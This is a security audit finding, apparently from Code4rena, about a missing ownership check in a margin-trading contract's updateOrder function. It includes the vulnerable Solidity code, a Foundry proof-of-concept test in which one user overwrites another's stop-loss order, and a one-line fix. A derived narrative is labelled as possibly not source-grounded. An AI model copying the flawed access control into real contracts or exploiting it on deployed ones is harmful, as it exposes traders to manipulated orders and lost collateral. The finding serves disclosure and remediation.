---
id: 20641
severity: "High"
---

# MarginTradingHook#updateOrder lacks access control

## Description

The `MarginTradingHook#updateOrder` function allows users to update their orders, it checks that the requested order is active order (L513) and that the function caller has opened position (L515). However, this function fails to check that user `initPosId` is equal to the `initPosId` saved in the order struct, meaning that the caller is an order creator:
    
```solidity
function updateOrder(
    uint _posId,
    uint _orderId,
    uint _triggerPrice_e36,
    address _tokenOut,
    uint _limitPrice_e36,
    uint _collAmt
) external { 
    _require(_collAmt != 0, Errors.ZERO_VALUE);
    Order storage order = __orders[_orderId];
    _require(order.status == OrderStatus.Active, Errors.INVALID_INPUT);
    uint initPosId = initPosIds[msg.sender][_posId];
    _require(initPosId != 0, Errors.POSITION_NOT_FOUND);
    MarginPos memory marginPos = __marginPositions[initPosId];
    uint collAmt = IPosManager(POS_MANAGER).getCollAmt(initPosId, marginPos.collPool);
    _require(_collAmt <= collAmt, Errors.INPUT_TOO_HIGH);

    order.triggerPrice_e36 = _triggerPrice_e36;
    order.limitPrice_e36 = _limitPrice_e36;
    order.collAmt = _collAmt;
    order.tokenOut = _tokenOut;
    emit UpdateOrder(initPosId, _orderId, _tokenOut, _triggerPrice_e36, _limitPrice_e36, _collAmt);
}
```

## Proof of Concept

The next test added to the `TestMarginTradingHelper` file could show a scenario when the user can update some other active orders:
    
```solidity
function testUpdateNotOwnerOrder() public {
    _setUpDexLiquidity(QUOTE_TOKEN, BASE_TOKEN);
    address tokenIn = USDT;
    address collToken = WETH;
    address borrToken = USDT;
    {
        (uint posIdAlice, uint initPosIdAlice) = _openPos(tokenIn, collToken, borrToken, ALICE, 10_000, 10_000);

        (uint posIdBob, ) = _openPos(tokenIn, collToken, borrToken, BOB, 10_000, 10_000);

        uint markPrice_e36 = lens.getMarkPrice_e36(collToken, borrToken);
        uint triggerPrice_e36 = markPrice_e36 * 9 / 10; // 90% from mark price
        uint limitPrice_e36 = markPrice_e36 * 89 / 100; // 89% from mark price
        address tokenOut = WETH;
        MarginPos memory marginPos = hook.getMarginPos(initPosIdAlice);
        uint orderIdAlice = _addStopLossOrder(
            ALICE,
            posIdAlice,
            triggerPrice_e36,
            tokenOut,
            limitPrice_e36,
            positionManager.getCollAmt(initPosIdAlice, marginPos.collPool)
        );
        vm.startPrank(BOB, BOB);
        hook.updateOrder(posIdBob, orderIdAlice, triggerPrice_e36 - 1, tokenOut, limitPrice_e36, 1000);
        vm.stopPrank();
        Order memory order = hook.getOrder(orderIdAlice);
        require(order.triggerPrice_e36 == triggerPrice_e36 - 1, 'order not updated');
    }
}
```

## Recommendation

Consider adding a check that prevents the possibility of updating arbitrary orders, similar to the `cancelOrder` function:
    
```solidity
_require(order.initPosId == initPosId, Errors.INVALID_INPUT);
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the function that allows a user to modify an existing order in a margin‑trading contract. The function checks that the order is currently active and that the caller has an opened position, but it does not verify that the position identifier belonging to the caller matches the position identifier stored inside the order data structure. Because of this missing ownership check, any participant who holds any active position can supply the identifier of another user’s order and successfully overwrite the order’s parameters such as trigger price, limit price, collateral amount and the token to be received. An attacker can therefore hijack a stop‑loss or take‑profit order that belongs to a different trader, change the price thresholds to values that cause premature liquidation or unfavorable execution, and potentially force the victim to lose collateral or miss a profit opportunity. The issue manifests only when the order is in the Active state and the caller’s position identifier is non‑zero, conditions that are common in a live trading environment. All users who open positions are affected because they can be either the victim of a tampered order or the attacker who can manipulate others’ orders. The flaw was discovered during a manual audit by Code4rena when the reviewers noticed that the updateOrder routine performed only a generic position existence check and then added a test case that demonstrated a cross‑account update. The problem is subtle because the function appears to enforce reasonable constraints – active order and existing position – which can give a false sense of security, making the missing equality comparison easy to overlook. To remediate the issue, the contract should enforce proper ownership by adding a requirement that the stored initPosId inside the order equals the initPosId derived from the caller’s address, mirroring the check used in the cancelOrder function. This change restores the intended access control, ensuring that only the creator of an order can modify its parameters, and prevents unauthorized manipulation that could lead to unexpected order execution, loss of funds, or broken accounting assumptions in the protocol.
